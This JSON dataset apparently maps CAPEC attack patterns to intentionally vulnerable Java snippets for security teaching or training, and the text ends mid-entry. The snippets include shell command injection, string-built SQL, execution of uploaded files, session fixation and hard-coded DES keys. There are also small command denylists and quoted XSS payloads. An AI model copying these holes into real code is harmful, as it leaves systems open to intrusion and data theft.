[
    {
        "capec_id": "1",
        "capec_name": "Accessing Functionality Not Properly Constrained by ACLs",
        "code_snippet": "public class FileAccessManager {\n    private static final String UPLOAD_DIR = \"/var/www/uploads/\";\n    \n    public void handleFileUpload(String fileName, byte[] content, String userRole) {\n        File targetFile = new File(UPLOAD_DIR + fileName);\n        \n        try {\n            // No validation of file type or user permissions\n            FileOutputStream fos = new FileOutputStream(targetFile);\n            fos.write(content);\n            fos.close();\n            \n            // Set default permissions - readable/writable by everyone\n            targetFile.setReadable(true, false);\n            targetFile.setWritable(true, false);\n            targetFile.setExecutable(true, false);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n    \n    public boolean accessResource(String resourcePath, String userRole) {\n        // Missing proper authorization check\n        // Default allow if no ACL is specified\n        return true;\n    }\n}",
        "description": "This vulnerable code demonstrates improper authorization and incorrect default permissions. The handleFileUpload method allows any file type to be uploaded without validation and sets unsafe default permissions. The accessResource method fails to implement proper access control checks, defaulting to allowing access when no ACL is specified. This can lead to unauthorized access to sensitive resources and potential system compromise."
    },
    {
        "capec_id": "2",
        "capec_name": "Inducing Account Lockout",
        "code_snippet": "public class AccountLockoutManager {\n    private static final int MAX_ATTEMPTS = 3;\n    private static final int LOCKOUT_DURATION = 30; // minutes\n    private Map<String, Integer> failedAttempts = new HashMap<>();\n    private Map<String, LocalDateTime> lockoutTime = new HashMap<>();\n\n    public boolean authenticate(String username, String password) {\n        if (isAccountLocked(username)) {\n            return false;\n        }\n\n        if (!validateCredentials(username, password)) {\n            incrementFailedAttempts(username);\n            return false;\n        }\n\n        failedAttempts.remove(username);\n        return true;\n    }\n\n    private boolean isAccountLocked(String username) {\n        LocalDateTime lockedTime = lockoutTime.get(username);\n        if (lockedTime != null) {\n            return lockedTime.plusMinutes(LOCKOUT_DURATION).isAfter(LocalDateTime.now());\n        }\n        return false;\n    }\n\n    private void incrementFailedAttempts(String username) {\n        int attempts = failedAttempts.getOrDefault(username, 0) + 1;\n        failedAttempts.put(username, attempts);\n\n        if (attempts >= MAX_ATTEMPTS) {\n            lockoutTime.put(username, LocalDateTime.now());\n        }\n    }\n\n    private boolean validateCredentials(String username, String password) {\n        // Weak password validation\n        return password.length() >= 4;\n    }\n}",
        "description": "This code demonstrates a vulnerable account lockout mechanism that can be exploited for denial of service. The implementation has several weaknesses: a low threshold for maximum attempts (3), a fixed lockout duration, no IP-based rate limiting, weak password validation, and no mechanism to detect automated attempts. An attacker can easily lock out legitimate users by repeatedly attempting to login with incorrect credentials for targeted accounts."
    },
    {
        "capec_id": "3",
        "capec_name": "Using Leading 'Ghost' Character Sequences to Bypass Input Filters",
        "code_snippet": "public class PathValidator {\n    private static final String UPLOADS_DIR = \"/uploads/\";\n\n    public boolean isValidPath(String userInput) {\n        // Vulnerable validation before normalization\n        if (userInput.startsWith(UPLOADS_DIR)) {\n            String normalizedPath = normalize(userInput);\n            return true;\n        }\n        return false;\n    }\n\n    private String normalize(String path) {\n        // Basic normalization that doesn't handle all cases\n        return path.replace(\"..\", \"\").replace(\"//\", \"/\");\n    }\n\n    public File getFile(String userInput) {\n        if (isValidPath(userInput)) {\n            // An attacker could use %2e%2e%2f to represent ../\n            // which might bypass the simple validation but get decoded later\n            return new File(userInput);\n        }\n        throw new SecurityException(\"Invalid path\");\n    }\n}",
        "description": "This code is vulnerable to path traversal through encoding bypass. The validation occurs before proper decoding/normalization, allowing an attacker to use URL-encoded characters or alternate path representations that bypass the security check but are interpreted correctly when accessing the file system. The code also fails to properly handle multiple encoding schemes and path equivalence cases."
    },
    {
        "capec_id": "4",
        "capec_name": "Using Alternative IP Address Encodings",
        "code_snippet": "public class NetworkAuthenticator {\n    private static final String TRUSTED_DOMAIN = \"trusted-server.com\";\n    \n    public boolean authenticateUser(String clientIP) {\n        try {\n            // Vulnerable: Relying solely on IP and reverse DNS\n            InetAddress addr = InetAddress.getByName(clientIP);\n            String hostname = addr.getHostName();\n            \n            // Vulnerable: Simple string comparison without proper validation\n            if(hostname.endsWith(TRUSTED_DOMAIN)) {\n                return true;\n            }\n            \n            // Vulnerable: Accepting alternate IP formats without validation\n            String decodedIP = URLDecoder.decode(clientIP, \"UTF-8\");\n            if(decodedIP.matches(\"^192\\.168\\..*\")) {\n                return true;\n            }\n            \n            return false;\n        } catch(Exception e) {\n            return false;\n        }\n    }\n}",
        "description": "This code is vulnerable to IP address spoofing and format manipulation attacks. It demonstrates multiple weaknesses: relying on IP addresses for authentication, using reverse DNS resolution for security decisions, and improperly handling alternate IP address encodings. An attacker could bypass authentication by using encoded IP addresses or manipulating DNS records."
    },
    {
        "capec_id": "5",
        "capec_name": "Blue Boxing",
        "code_snippet": "public class TelephoneSwitch {\n    private boolean isAuthenticated = false;\n    \n    public void processToneSignal(String toneSignal) {\n        // Vulnerable: No proper validation of tone signal authenticity\n        if (toneSignal.contains(\"2600Hz\")) {\n            isAuthenticated = true;\n            grantSupervisorAccess();\n        }\n    }\n    \n    public void routeCall(String destination) {\n        // Vulnerable: No verification of signal origin\n        // No message integrity check\n        if (isAuthenticated) {\n            establishConnection(destination);\n        }\n    }\n    \n    private void grantSupervisorAccess() {\n        // Vulnerable: Simple boolean flag for authentication\n        // No proper authorization checks\n        System.out.println(\"Supervisor access granted\");\n    }\n    \n    private void establishConnection(String destination) {\n        // Vulnerable: No verification of endpoint authenticity\n        System.out.println(\"Routing call to: \" + destination);\n    }\n}",
        "description": "This code simulates a vulnerable telephone switch system that can be exploited through blue boxing. It demonstrates multiple security issues including improper authorization (CWE-285), lack of communication channel verification (CWE-923), insufficient source verification (CWE-940), vulnerability to replay attacks (CWE-294), and no message integrity checks (CWE-924). The system accepts tone signals without proper validation and grants supervisor access based on simple tone matching, allowing unauthorized access to privileged functions."
    },
    {
        "capec_id": "6",
        "capec_name": "Argument Injection",
        "code_snippet": "public class CommandExecutor {\n    public void executeCommand(String userInput) {\n        try {\n            String command = \"cmd.exe /c \" + userInput;\n            Process process = Runtime.getRuntime().exec(command);\n            process.waitFor();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void filterCommand(String input) {\n        String[] blacklist = {\"rm\", \"del\"};\n        boolean isValid = true;\n        \n        for (String forbidden : blacklist) {\n            if (input.contains(forbidden)) {\n                isValid = false;\n                break;\n            }\n        }\n        \n        if (isValid) {\n            executeCommand(input);\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates command injection through improper input validation. It accepts user input directly into a command execution context with only a basic blacklist filter that can be easily bypassed. The code fails to properly neutralize special characters, allowing attackers to inject additional OS commands. The incomplete blacklist and direct concatenation of user input into command strings makes it susceptible to command injection attacks."
    },
    {
        "capec_id": "7",
        "capec_name": "Blind SQL Injection",
        "code_snippet": "public boolean authenticateUser(String username, String password) {\n    boolean isValid = false;\n    try {\n        String query = \"SELECT * FROM users WHERE username = '\" + username + \"' AND password = '\" + password + \"'\";\n        Statement stmt = connection.createStatement();\n        ResultSet rs = stmt.executeQuery(query);\n        isValid = rs.next();\n    } catch (SQLException e) {\n        // Silently catch exception, hiding error details\n        return false;\n    }\n    return isValid;\n}",
        "description": "This code demonstrates blind SQL injection vulnerability by concatenating user inputs directly into SQL query while suppressing error messages. The Boolean return value can be used to infer information about the database structure through iterative probing, even without error messages. The code lacks input validation and proper SQL parameter sanitization, making it vulnerable to SQL injection attacks despite error suppression."
    },
    {
        "capec_id": "8",
        "capec_name": "Buffer Overflow in an API Call",
        "code_snippet": "public class VulnerableLibrary {\n    private static final int BUFFER_SIZE = 256;\n    \n    public static void copyUserData(byte[] input) {\n        byte[] buffer = new byte[BUFFER_SIZE];\n        \n        // Vulnerable method that doesn't check input size\n        System.arraycopy(input, 0, buffer, 0, input.length);\n        \n        // Process the copied data\n        processBuffer(buffer);\n    }\n    \n    public static void processBuffer(byte[] data) {\n        // Vulnerable array access without bounds checking\n        for(int i = 0; i <= data.length; i++) {\n            if(data[i] == 0) {\n                break;\n            }\n        }\n    }\n    \n    public static void main(String[] args) {\n        // Example of calling vulnerable method with oversized input\n        byte[] largeInput = new byte[512];\n        copyUserData(largeInput);\n    }\n}",
        "description": "This code represents a vulnerable shared library that contains multiple buffer-related vulnerabilities. The main issues include: buffer overflow in copyUserData() due to unchecked buffer copy, array bounds violation in processBuffer(), and no input validation. When this library is used by other applications, they inherit these vulnerabilities, demonstrating how shared vulnerable code can affect multiple systems."
    },
    {
        "capec_id": "9",
        "capec_name": "Buffer Overflow in Local Command-Line Utilities",
        "code_snippet": "public class CommandExecutor {\n    private static final int BUFFER_SIZE = 1024;\n\n    public static void executeCommand(String userInput) {\n        char[] buffer = new char[BUFFER_SIZE];\n        String command = \"/bin/sh -c \" + userInput;\n\n        try {\n            Process process = Runtime.getRuntime().exec(command);\n            BufferedReader reader = new BufferedReader(\n                new InputStreamReader(process.getInputStream()));\n            \n            int bytesRead = reader.read(buffer);\n            while (bytesRead > 0) {\n                // Unsafe: No bounds checking on buffer\n                for (int i = 0; i <= bytesRead; i++) {\n                    buffer[i + BUFFER_SIZE - 1] = buffer[i];\n                }\n                bytesRead = reader.read(buffer);\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code demonstrates multiple vulnerabilities related to command-line execution and buffer handling. It contains a command injection vulnerability by directly concatenating user input into a shell command, lacks proper input validation, and includes an unsafe buffer operation that can lead to buffer overflow. The buffer manipulation loop can write beyond array bounds, and the command execution is performed without proper sanitization or privilege checking."
    },
    {
        "capec_id": "10",
        "capec_name": "Buffer Overflow via Environment Variables",
        "code_snippet": "public class EnvironmentBufferOverflow {\n    public static void authenticate(String[] args) {\n        String pathEnv = System.getenv(\"PATH\");\n        char[] buffer = new char[50];\n        \n        // Copy PATH environment variable to buffer without size check\n        for(int i = 0; i < pathEnv.length(); i++) {\n            buffer[i] = pathEnv.charAt(i);  // Potential buffer overflow\n        }\n        \n        // Use buffer contents for authentication\n        String authToken = new String(buffer);\n        if(authToken.contains(\"admin\")) {\n            grantAdminAccess();\n        }\n    }\n    \n    private static void grantAdminAccess() {\n        // Grant administrative privileges\n        System.setProperty(\"user.role\", \"admin\");\n    }\n}",
        "description": "This vulnerable code demonstrates environment variable manipulation leading to a buffer overflow. It copies the PATH environment variable into a fixed-size buffer without bounds checking, potentially causing buffer overflow. It also contains an authentication bypass vulnerability by assuming environment variable content is trustworthy and using it for authentication decisions."
    },
    {
        "capec_id": "11",
        "capec_name": "Cause Web Server Misclassification",
        "code_snippet": "public class FileUploadServlet extends HttpServlet {\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String fileName = request.getParameter(\"filename\");\n        String uploadPath = \"/var/www/uploads/\";\n        \n        Part filePart = request.getPart(\"file\");\n        File uploadedFile = new File(uploadPath + fileName);\n        \n        // No validation of file extension or content type\n        try (InputStream input = filePart.getInputStream();\n             FileOutputStream output = new FileOutputStream(uploadedFile)) {\n            byte[] buffer = new byte[1024];\n            int length;\n            while ((length = input.read(buffer)) > 0) {\n                output.write(buffer, 0, length);\n            }\n            \n            // Determine handler based solely on file extension\n            String extension = fileName.substring(fileName.lastIndexOf(\".\"));\n            if (extension.equals(\".php\")) {\n                Runtime.getRuntime().exec(\"php \" + uploadPath + fileName);\n            } else if (extension.equals(\".jsp\")) {\n                request.getRequestDispatcher(fileName).forward(request, response);\n            }\n        }\n    }\n}",
        "description": "This code demonstrates vulnerable file upload handling where the server relies solely on the file extension to determine how to process uploaded files. It accepts a filename parameter without validation, stores files in a web-accessible directory, and executes different handlers based on file extensions without proper content verification. This allows attackers to upload malicious files with spoofed extensions or exploit file inclusion vulnerabilities."
    },
    {
        "capec_id": "12",
        "capec_name": "Choosing Message Identifier",
        "code_snippet": "public class MessageBusService {\n    private static final String MULTICAST_ADDRESS = \"239.255.255.250\";\n    private static final int PORT = 1900;\n\n    public void sendMessage(String message, String clientId) {\n        try {\n            MulticastSocket socket = new MulticastSocket(PORT);\n            InetAddress group = InetAddress.getByName(MULTICAST_ADDRESS);\n            socket.joinGroup(group);\n\n            // No authentication check for client ID\n            String payload = clientId + \"::\" + message;\n            byte[] buffer = payload.getBytes();\n            DatagramPacket packet = new DatagramPacket(buffer, buffer.length, group, PORT);\n            socket.send(packet);\n\n            socket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public String receiveMessage() {\n        try {\n            MulticastSocket socket = new MulticastSocket(PORT);\n            InetAddress group = InetAddress.getByName(MULTICAST_ADDRESS);\n            socket.joinGroup(group);\n\n            byte[] buffer = new byte[1024];\n            DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n            socket.receive(packet);\n\n            // No validation of sender identity\n            // No message integrity check\n            String message = new String(packet.getData(), 0, packet.getLength());\n            socket.close();\n            return message;\n        } catch (IOException e) {\n            e.printStackTrace();\n            return null;\n        }\n    }\n}",
        "description": "This vulnerable code implements a multicast messaging system that allows clients to send and receive messages without proper authentication, message integrity checks, or security identifier validation. Messages are transmitted with client IDs in plain text, allowing attackers to impersonate other clients. The code lacks validation of sender identity and message integrity, making it susceptible to message tampering and unauthorized access to sensitive information."
    },
    {
        "capec_id": "13",
        "capec_name": "Subverting Environment Variable Values",
        "code_snippet": "public class ConfigManager {\n    public static void loadConfiguration(String envPath) {\n        try {\n            String configPath = System.getenv(envPath);\n            if(configPath != null) {\n                ProcessBuilder pb = new ProcessBuilder(\"cmd.exe\", \"/c\", \"type \" + configPath);\n                pb.environment().put(\"APP_SECRET\", \"sensitive_value\");\n                Process p = pb.start();\n                \n                // Read and apply config without validation\n                BufferedReader reader = new BufferedReader(\n                    new InputStreamReader(p.getInputStream()));\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    String[] parts = line.split(\"=\");\n                    if(parts.length == 2) {\n                        System.setProperty(parts[0], parts[1]);\n                    }\n                }\n            }\n        } catch(Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code allows manipulation of environment variables and system properties through an external configuration file. It lacks input validation, allows path traversal through environment variables, performs no integrity checks on loaded data, and may expose sensitive information through system properties. The code executes shell commands based on user input and sets system properties without proper authorization or sanitization."
    },
    {
        "capec_id": "14",
        "capec_name": "Client-side Injection-induced Buffer Overflow",
        "code_snippet": "public class VulnerableServer {\n    private static final int BUFFER_SIZE = 1024;\n    \n    public void processClientRequest(Socket clientSocket) {\n        try {\n            byte[] buffer = new byte[BUFFER_SIZE];\n            InputStream input = clientSocket.getInputStream();\n            \n            // Read client data without size validation\n            int bytesRead = input.read(buffer);\n            \n            // Process received data without bounds checking\n            byte[] responseBuffer = new byte[256];\n            for(int i = 0; i < bytesRead; i++) {\n                responseBuffer[i] = (byte)(buffer[i] + 1);\n            }\n            \n            // Send response without integrity check\n            OutputStream output = clientSocket.getOutputStream();\n            output.write(responseBuffer);\n            output.flush();\n            \n        } catch(IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates a server that processes client requests without proper input validation or buffer size checks. It copies data between buffers without verifying sizes, lacks integrity checks, and can lead to buffer overflows through unchecked array indexing. The code is susceptible to malicious clients sending oversized data that can overflow the fixed-size buffers."
    },
    {
        "capec_id": "15",
        "capec_name": "Command Delimiters",
        "code_snippet": "public class FileProcessor {\n    private static final String[] DENIED_CHARS = {\";\", \"&\", \"||\"};\n    \n    public void processUserCommand(String userInput) {\n        if (isInputSafe(userInput)) {\n            try {\n                String command = \"cmd.exe /c dir \" + userInput;\n                Runtime.getRuntime().exec(command);\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n    \n    private boolean isInputSafe(String input) {\n        for (String denied : DENIED_CHARS) {\n            if (input.contains(denied)) {\n                return false;\n            }\n        }\n        return true;\n    }\n}",
        "description": "This vulnerable code attempts to protect against command injection by using a denylist approach, checking for common command delimiters. However, it fails to account for all possible command delimiters and special characters (like backticks, dollar signs, or escaped characters) that could be used to inject commands. The input validation relies on a simple contains() check and an incomplete list of denied characters, making it possible for an attacker to bypass the protection using alternative delimiters not in the denylist."
    },
    {
        "capec_id": "16",
        "capec_name": "Dictionary-based Password Attack",
        "code_snippet": "public class UserAuthentication {\n    private static final int MAX_PASSWORD_AGE_DAYS = 365; // Too long password expiration\n    \n    public boolean authenticateUser(String username, String password) {\n        String storedHash = getUserPasswordHash(username);\n        String inputHash = hashPassword(password);\n        \n        // Simple single-factor authentication\n        if (storedHash != null && storedHash.equals(inputHash)) {\n            return true;\n        }\n        return false;\n    }\n    \n    public boolean validateNewPassword(String password) {\n        // Weak password requirements\n        return password != null && password.length() >= 6;\n    }\n    \n    public boolean createAccount(String username, String password) {\n        if (validateNewPassword(password)) {\n            String hashedPassword = hashPassword(password);\n            saveUserCredentials(username, hashedPassword);\n            return true;\n        }\n        return false;\n    }\n    \n    private String hashPassword(String password) {\n        // Weak hashing implementation\n        return password.hashCode() + \"\";\n    }\n    \n    private String getUserPasswordHash(String username) {\n        // Database lookup simulation\n        return null;\n    }\n    \n    private void saveUserCredentials(String username, String hashedPassword) {\n        // Database save simulation\n    }\n}",
        "description": "This code demonstrates multiple security vulnerabilities including weak password requirements (only length >= 6), no password aging management, single-factor authentication, and weak password hashing. The authentication system lacks protection against brute force attacks and dictionary attacks, making it susceptible to password guessing attempts."
    },
    {
        "capec_id": "17",
        "capec_name": "Using Malicious Files",
        "code_snippet": "public class FileExecutor {\n    public static void executeUploadedFile(String filePath) {\n        try {\n            // Vulnerable: No permission or ownership checks\n            File file = new File(filePath);\n            \n            // Vulnerable: No validation of file path or symlinks\n            ProcessBuilder pb = new ProcessBuilder(file.getAbsolutePath());\n            \n            // Vulnerable: Executes with current process privileges\n            Process process = pb.start();\n            \n            // Vulnerable: No restrictions on execution context\n            process.waitFor();\n            \n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n    \n    public static void main(String[] args) {\n        // Vulnerable: Direct execution of user-provided path\n        executeUploadedFile(\"/user/uploads/userscript.sh\");\n    }\n}",
        "description": "This code demonstrates a vulnerable file execution system that allows direct execution of files without proper permission checks, authorization, or privilege management. It fails to validate file paths, verify ownership, check for symbolic links, or implement proper privilege restrictions, making it susceptible to unauthorized execution attacks."
    },
    {
        "capec_id": "18",
        "capec_name": "XSS Targeting Non-Script Elements",
        "code_snippet": "public class ImageGallery extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String imageUrl = request.getParameter(\"url\");\n        String imgElement = \"<img src='\" + imageUrl + \"' alt='User Image'>\";\n        \n        PrintWriter out = response.getWriter();\n        response.setContentType(\"text/html\");\n        out.println(\"<html><body>\");\n        out.println(\"<h2>Image Gallery</h2>\");\n        out.println(imgElement);\n        out.println(\"</body></html>\");\n    }\n}",
        "description": "This vulnerable code demonstrates improper handling of user input in an image tag. It directly embeds user-provided URL into an img tag without any sanitization, allowing potential XSS attacks through malformed image URLs containing JavaScript (e.g., 'javascript:alert(1)' or 'x' onerror='alert(1)'). The code fails to validate or encode special characters in the imageUrl parameter before inserting it into the HTML output."
    },
    {
        "capec_id": "19",
        "capec_name": "Embedding Scripts within Scripts",
        "code_snippet": "public class WebScriptExecutor {\n    private boolean isAuthenticated = false;\n\n    public void executeUserScript(String userInput) {\n        // No input sanitization or access control\n        String scriptTag = \"<script>\" + userInput + \"</script>\";\n        \n        // Embedding untrusted external script\n        String externalWidget = \"<script src='http://untrusted-domain.com/widget.js'></script>\";\n        \n        // Vulnerable recursive script execution\n        if(!isAuthenticated) {\n            executeUserScript(scriptTag + externalWidget);\n        }\n        \n        // Directly evaluating user input in page context\n        StringBuilder page = new StringBuilder();\n        page.append(\"<html><body>\");\n        page.append(scriptTag);\n        page.append(externalWidget);\n        page.append(\"</body></html>\");\n        \n        // Send to browser without any security checks\n        renderPage(page.toString());\n    }\n\n    private void renderPage(String content) {\n        // Simulated page rendering\n    }\n}",
        "description": "A vulnerable Java code snippet demonstrating multiple script injection vulnerabilities including improper access control, unsanitized XSS, inclusion of untrusted external scripts, uncontrolled script execution, and potential for malicious code execution through nested calls."
    },
    {
        "capec_id": "20",
        "capec_name": "Encryption Brute Forcing",
        "code_snippet": "public class WeakEncryption {\n    private static final String FIXED_KEY = \"abc123\";  // Hard-coded key\n    private static final String FIXED_IV = \"1234567890123456\";  // Fixed IV\n\n    public static String encrypt(String plaintext) {\n        try {\n            Cipher cipher = Cipher.getInstance(\"DES/CBC/PKCS5Padding\");  // Using weak DES algorithm\n            SecretKeySpec keySpec = new SecretKeySpec(FIXED_KEY.getBytes(), \"DES\");\n            IvParameterSpec ivSpec = new IvParameterSpec(FIXED_IV.getBytes());\n            \n            cipher.init(Cipher.ENCRYPT_MODE, keySpec, ivSpec);\n            byte[] encrypted = cipher.doFinal(plaintext.getBytes());\n            return Base64.getEncoder().encodeToString(encrypted);\n        } catch (Exception e) {\n            return null;\n        }\n    }\n}",
        "description": "This code demonstrates multiple cryptographic vulnerabilities: using a weak DES algorithm, hard-coded cryptographic key, fixed initialization vector (IV), and insufficient key length. These weaknesses make the encryption susceptible to brute force attacks as the key space is limited and predictable."
    },
    {
        "capec_id": "21",
        "capec_name": "Exploitation of Trusted Identifiers",
        "code_snippet": "public class SessionManager {\n    private static Map<String, String> sessions = new HashMap<>();\n    private static final String COOKIE_NAME = \"sessionId\";\n\n    public static void createSession(HttpServletRequest request, HttpServletResponse response) {\n        String sessionId = request.getParameter(\"sessionId\");\n        if (sessionId == null) {\n            sessionId = \"USER_\" + System.currentTimeMillis();\n        }\n        sessions.put(sessionId, request.getParameter(\"username\"));\n        Cookie cookie = new Cookie(COOKIE_NAME, sessionId);\n        cookie.setHttpOnly(false);\n        cookie.setSecure(false);\n        cookie.setMaxAge(Integer.MAX_VALUE);\n        response.addCookie(cookie);\n    }\n\n    public static boolean isAuthenticated(HttpServletRequest request) {\n        Cookie[] cookies = request.getCookies();\n        if (cookies != null) {\n            for (Cookie cookie : cookies) {\n                if (COOKIE_NAME.equals(cookie.getName())) {\n                    return sessions.containsKey(cookie.getValue());\n                }\n            }\n        }\n        return false;\n    }\n}",
        "description": "This vulnerable code demonstrates multiple session management issues including session fixation (accepting user-provided session IDs), use of persistent cookies containing sensitive data, insufficient session ID generation, and lack of proper session validation. The code allows client-side manipulation of session data, stores session information in an insecure manner, and doesn't validate the origin of requests."
    },
    {
        "capec_id": "22",
        "capec_name": "Exploiting Trust in Client",
        "code_snippet": "public class SimpleAuthServer {\n    private static Map<String, String> sessions = new HashMap<>();\n\n    public static boolean authenticateUser(String clientId, String sessionToken) {\n        // Vulnerable: No validation of token format or origin\n        if (sessions.containsKey(clientId)) {\n            return sessions.get(clientId).equals(sessionToken);\n        }\n        return false;\n    }\n\n    public static String getUserData(String clientId, String sessionToken) {\n        // Vulnerable: Direct use of client-provided data without proper validation\n        if (authenticateUser(clientId, sessionToken)) {\n            return \"Sensitive user data for \" + clientId;\n        }\n        return \"Access denied\";\n    }\n\n    public static void main(String[] args) {\n        // Example usage\n        sessions.put(\"user123\", \"simple_token\");\n        \n        // Attacker can easily spoof these values\n        String data = getUserData(\"user123\", \"simple_token\");\n        System.out.println(data);\n    }\n}",
        "description": "This code demonstrates vulnerable client/server authentication where an attacker can easily spoof client credentials. The server implements weak authentication by using simple token comparison without proper validation, origin verification, or protection against spoofing. The code exhibits multiple vulnerabilities including improper authentication, lack of input validation, and exposure of sensitive information through a weak protection mechanism."
    },
    {
        "capec_id": "23",
        "capec_name": "File Content Injection",
        "code_snippet": "public class FileUploadHandler extends HttpServlet {\n    private static final String UPLOAD_DIR = \"/uploads/\";\n    \n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String fileName = request.getHeader(\"X-Filename\");\n        String contentType = request.getHeader(\"Content-Type\");\n        \n        File uploadedFile = new File(UPLOAD_DIR + fileName);\n        try (FileOutputStream fos = new FileOutputStream(uploadedFile);\n             InputStream is = request.getInputStream()) {\n            byte[] buffer = new byte[4096];\n            int bytesRead;\n            while ((bytesRead = is.read(buffer)) != -1) {\n                fos.write(buffer, 0, bytesRead);\n            }\n            \n            // Automatically process uploaded files based on extension\n            if (fileName.endsWith(\".exe\") || fileName.endsWith(\".dll\")) {\n                Runtime.getRuntime().exec(uploadedFile.getAbsolutePath());\n            }\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates insecure file upload handling by accepting files without proper validation. It relies solely on file extensions for processing decisions, stores files in a web-accessible directory, and automatically executes certain file types. The code lacks input validation for file names and content types, and directly executes uploaded files with certain extensions, making it susceptible to malicious file uploads and remote code execution."
    },
    {
        "capec_id": "24",
        "capec_name": "Filter Failure through Buffer Overflow",
        "code_snippet": "public class FilterBypass {\n    public static boolean filterInput(String input) {\n        char[] buffer = new char[64];\n        try {\n            input.getChars(0, input.length(), buffer, 0);\n            // Basic filter check\n            for(int i = 0; i <= input.length(); i++) {\n                if(buffer[i] == '<' || buffer[i] == '>') {\n                    return false;\n                }\n            }\n            return true;\n        } catch(Exception e) {\n            // On error, let input pass through\n            return true;\n        }\n    }\n\n    public static void processUserInput(String userInput) {\n        if(filterInput(userInput)) {\n            // Vulnerable string copy without proper bounds checking\n            char[] destination = new char[50];\n            userInput.getChars(0, userInput.length(), destination, 0);\n            executeCommand(new String(destination));\n        }\n    }\n\n    private static void executeCommand(String cmd) {\n        // Process the command\n        System.out.println(cmd);\n    }\n}",
        "description": "This code contains multiple vulnerabilities related to buffer overflow and filter bypass. It attempts to filter input but has a buffer overflow vulnerability due to improper bounds checking, uses an oversized input to potentially bypass the filter, and fails open (allows input through) when an exception occurs. The code also contains an incorrect array bounds check that could lead to an ArrayIndexOutOfBoundsException, and the filter can be bypassed by providing input larger than the buffer size."
    },
    {
        "capec_id": "25",
        "capec_name": "Forced Deadlock",
        "code_snippet": "public class BankAccount {\n    private double balance;\n    private final Object lock1 = new Object();\n    private final Object lock2 = new Object();\n\n    public void transfer(BankAccount other, double amount) {\n        synchronized(lock1) {\n            try {\n                Thread.sleep(100); // Simulate some work\n            } catch (InterruptedException e) {}\n            \n            synchronized(lock2) {\n                if (this.balance >= amount) {\n                    this.balance -= amount;\n                    other.balance += amount;\n                }\n            }\n        }\n    }\n\n    public void receiveTransfer(BankAccount other, double amount) {\n        synchronized(lock2) {\n            try {\n                Thread.sleep(100); // Simulate some work\n            } catch (InterruptedException e) {}\n            \n            synchronized(lock1) {\n                if (other.balance >= amount) {\n                    other.balance -= amount;\n                    this.balance += amount;\n                }\n            }\n        }\n    }\n}",
        "description": "This code demonstrates a classic deadlock scenario in a banking system where two threads can become permanently blocked waiting for each other's locks. The transfer and receiveTransfer methods acquire locks in different orders, creating a circular wait condition. If one thread calls transfer while another simultaneously calls receiveTransfer, both threads can end up waiting indefinitely for locks held by the other thread, resulting in a deadlock."
    },
    {
        "capec_id": "26",
        "capec_name": "Leveraging Race Conditions",
        "code_snippet": "public class BankAccount {\n    private double balance;\n\n    public BankAccount(double initialBalance) {\n        this.balance = initialBalance;\n    }\n\n    public void withdraw(double amount) {\n        if (balance >= amount) {\n            // Simulate some processing time\n            try {\n                Thread.sleep(100);\n            } catch (InterruptedException e) {}\n            \n            balance -= amount;\n        }\n    }\n\n    public static void main(String[] args) {\n        BankAccount account = new BankAccount(1000);\n        \n        // Create two threads trying to withdraw money simultaneously\n        Thread t1 = new Thread(() -> account.withdraw(800));\n        Thread t2 = new Thread(() -> account.withdraw(800));\n        \n        t1.start();\n        t2.start();\n    }\n}",
        "description": "This code demonstrates a classic race condition vulnerability in a bank account system. The withdraw method checks the balance and then performs the withdrawal without proper synchronization. If two threads attempt to withdraw money simultaneously, they might both pass the initial balance check before either one actually reduces the balance, potentially allowing withdrawals that exceed the actual balance. The artificial delay makes the race condition more likely to occur."
    },
    {
        "capec_id": "27",
        "capec_name": "Leveraging Race Conditions via Symbolic Links",
        "code_snippet": "public class FileProcessor {\n    private static final String TEMP_DIR = \"/tmp/\";\n\n    public void processUserData(String fileName) {\n        String tempPath = TEMP_DIR + fileName;\n        \n        try {\n            // Check if temporary file exists\n            File tempFile = new File(tempPath);\n            if (!tempFile.exists()) {\n                // Vulnerable time window between check and creation\n                Thread.sleep(100); // Simulating some processing\n                \n                // Create and write to temporary file\n                FileWriter writer = new FileWriter(tempFile);\n                writer.write(\"sensitive data\");\n                writer.close();\n                \n                // Process the file\n                processFile(tempPath);\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    private void processFile(String path) {\n        // Process file contents\n    }\n}",
        "description": "This code demonstrates a vulnerable TOCTOU (Time-of-Check Time-of-Use) race condition where an attacker can exploit the time window between checking for a file's existence and its creation. During this window, an attacker could create a symbolic link with the same name as the temporary file, pointing to a sensitive system file. When the program writes to what it believes is its temporary file, it actually writes to the sensitive file through the symlink. The code lacks proper file locking mechanisms and synchronization, making it vulnerable to symlink attacks."
    },
    {
        "capec_id": "28",
        "capec_name": "Fuzzing",
        "code_snippet": "public class InputProcessor {\n    public void processUserData(String input) {\n        try {\n            // No input validation or sanitization\n            String command = \"cmd.exe /c \" + input;\n            Runtime.getRuntime().exec(command);\n        } catch (Exception e) {\n            // Reveals sensitive system information in error message\n            System.err.println(\"Error executing command on system \" + \n                System.getProperty(\"user.name\") + \": \" + \n                e.getMessage() + \n                \" at path: \" + System.getProperty(\"user.dir\"));\n        }\n    }\n\n    public boolean validateInput(String input) {\n        // Incomplete blacklist\n        String[] blacklist = {\"rm\", \"del\"};\n        for(String banned : blacklist) {\n            if(input.contains(banned)) return false;\n        }\n        return true;\n    }\n}",
